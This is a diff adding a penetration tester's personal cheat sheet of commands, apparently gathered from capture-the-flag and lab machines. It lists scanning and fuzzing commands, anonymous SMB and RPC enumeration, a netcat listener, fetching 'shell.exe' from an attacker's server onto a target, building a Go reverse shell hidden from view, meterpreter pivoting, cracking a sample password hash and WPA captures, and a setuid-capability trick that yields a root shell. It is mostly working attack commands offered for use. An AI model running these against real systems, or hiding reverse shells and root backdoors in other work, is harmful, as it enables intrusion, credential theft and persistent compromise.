@@ -1,0 +1,119 @@
+https://www.xda-developers.com/wsl-connect-usb-devices-windows-11/
+
+## nmap
+
+    nmap -A -T5 -sV -sC -Pn -p- -oX NAME IP
+        --top-ports 1000
+
+## gobuster
+    gobuster -t 100 -w /home/hydr0burn/SecLists/common.txt -u http://10.129.42.249/
+
+## wfuzz
+    wfuzz -t 400 -c -w /root/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403,302,301 -H "Host: FUZZ.office.paper" -u http://office.paper -t 500
+    
+    wfuzz -c 400 -w /root/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt 'http://10.129.177.121/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl='FUZZ -t 500
+
+    wfuzz -t 400 -c -w /home/hydr0burn/SecLists/Usernames/xato-net-10-million-usernames.txt --hc 400,404 'http://192.168.94.48:1898/?q=user/'FUZZ
+
+## python
+    /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash");'
+
+## nikto
+    nikto -D on -h IP
+    
+## SMB
+    smbmap -H IP -u '' -p ' '
+    smbclient -L <targetip>
+    smbclient \\\\<targetip>\\ShareName
+    smbclient -U 'user' \\\\IP\\folder
+
+## nc
+    nc -lvnp 666
+
+## Python SimpleHTTPServer
+    #on Attacker
+        python -m http.server
+
+    #on target
+        wget <attackerip>:8000/filename // linux
+
+        ## windows
+        $client = new-object System.Net.WebClient
+        $client.DownloadFile("http://172.29.45.39:8000/shell.exe","shell.exe")
+
+        ## WINPEAS COLORS
+            The ouput will be colored using ansi colors. If you are executing winpeas.exe from a Windows console, you need to set a registry value to see the colors (and open a new CMD):
+                REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+
+## meterpreter pivot
+    ssh_login // login or exploit target
+    shell_to_meterpreter // must have meterpreter to use autoroute
+    autoroute
+    sessions show or -i X
+    portscan/tcp
+
+## start powershell as admin from powershell 
+    powershell start-process powershell -verb runas
+
+##########  TO HIDE GO APPS IN WINDOWS #############
+##########  TO HIDE GO APPS IN WINDOWS #############
+    go build -ldflags=all='-H windowsgui' .\reverse_shell.go
+##########  TO HIDE GO APPS IN WINDOWS #############
+##########  TO HIDE GO APPS IN WINDOWS #############
+
+
+## autorecon
+    autorecon IP
+    autorecon --heartbeat 10 IP
+
+## msrpc
+    rpcclient -U "" IP
+        enumdomusers
+        queryuser 0x457 (to look for creds)
+
+
+## netstat and ip show
+    netstat -rn
+    ip -4 a show tun0
+
+## evil-winrm
+    check out "found a pfx on win"
+    
+
+
+## hashid
+    the -m tells you what mode in hashcat
+    hashid -m '$6$.uNrQ5.JcbqVEfSR$Dn5HFNk7i5yAb.UY2ZpXe9j2gKLNQAM2JIfXBH8hdhCW9YCMaaaaPt.GHHnoN3E2/w/5w6yHUD.CMzM1NPQnT.'
+
+## hashcat
+    sudo hashcat -a 3 -m 1800 '$6$.uNrQ5.JcbqVEfSR$Dn5HFNk7i5yAb.UY2ZpXe9j2gKLNQAM2JIfXBH8hdhCW9YCMaaaaPt.GHHnoN3E2/w/5w6yHUD.CMzM1NPQnT.' ?a1?a?a?a3riC?s1871 -O -w 4
+    to convert cap to hccapx
+        hcxpcapngtool -o FILE.hc22000 INPUT.cap
+        hashcat -a 0 -m 22000 /wordlist
+
+    hashcat -a 3 -m 22000 mizerhome.hc22000 ?d?d?d?d?d?d?d?d 
+
+## if depends error because of apt package
+    apt-cache policy PACKAGE 
+    apt install PACKAGE=version -V
+
+## apk
+    apktool d NAME.apk
+    
+## grep
+    grep -R -i "WORD" FOLDER 
+
+https://pixabay.com/videos/search/intro/?pagi=1
+
+## kill port
+    fuser 8080/tcp
+    fuser -k 8080/tcp
+    
+## list all services 
+    systemctl list-units --type=service --all
+
+
+### YOU NEED ROOT TO (could be executed by a rough admin)
+    setcap cap_setuid+ep /usr/bin/python3.10
+        THEN you can
+            /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash");'
